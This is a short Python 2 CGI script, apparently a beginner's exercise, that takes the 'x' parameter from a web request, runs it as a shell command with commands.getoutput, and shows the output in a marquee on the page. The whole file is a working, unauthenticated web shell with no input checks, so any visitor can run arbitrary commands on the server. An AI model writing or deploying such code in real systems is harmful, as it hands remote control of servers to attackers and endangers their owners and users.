#!/usr/bin/python2
import cgi #get data from cgi
import commands

print "Content-type:text/html"  #the type of content will be html
print "" 

web_data=cgi.FieldStorage()
#to extract only the necessary info,the data sent by client.Here x is the actual variable in the link in which data is stored


out= web_data.getvalue('x') 
result=commands.getoutput(out)
print"<h1>"
print "<marquee>"
print result
print "</marquee>"
print"</h1>"

#<pre> this tag is used for proper orientation 
#chmod +x cmd.py
